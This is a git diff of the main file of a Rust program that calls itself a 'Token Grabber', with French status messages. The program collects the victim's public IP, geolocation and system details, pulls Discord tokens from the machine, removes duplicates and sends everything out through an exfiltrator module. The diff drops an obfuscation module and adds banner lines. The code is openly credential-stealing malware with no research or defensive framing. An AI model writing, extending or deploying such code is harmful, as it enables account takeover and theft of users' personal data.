@@ -1,18 +1,21 @@
 mod exfiltrator;
 mod extractor;
-mod obfuscation;
 mod utils;
 
 use exfiltrator::Exfiltrator;
 use extractor::Extractor;
-use serde_json::json;
 use utils::{get_geolocation, get_public_ip, get_system_info, get_timestamp};
+use serde_json::json;
 
 #[tokio::main]
 async fn main() {
-    println!("Token Grabber en Rust");
+    println!("~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~");
+    println!("Token Grabber by Vullwen & BySajed");
+    println!("~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~");
 
-    println!("Test ip:");
+    println!("\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~");
+    println!("Recherche d'informations...");
+    println!("~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~");
     let ip = match get_public_ip().await {
         Ok(Some(ip_str)) => {
             println!("IP publique : {}", ip_str);
@@ -41,6 +44,9 @@ async fn main() {
 
     let mut entries = Vec::new();
 
+    println!("\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~");
+    println!("Recherche de tokens...");
+    println!("~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~");
     let tokens = extractor.extract_discord_tokens();
     //supprimer les doublons
     let tokens: Vec<String> = tokens.into_iter().collect::<std::collections::HashSet<_>>().into_iter().collect();
@@ -61,7 +67,9 @@ async fn main() {
     });
     entries.push(data);
 
-    // 5. Envoi
+    println!("\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~");
+    println!("Envoi...");
+    println!("~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~");
     if let Err(err) = run_token_grabber(&exfiltrator, entries).await {
         eprintln!("Erreur lors de l’exécution : {}", err);
     } 
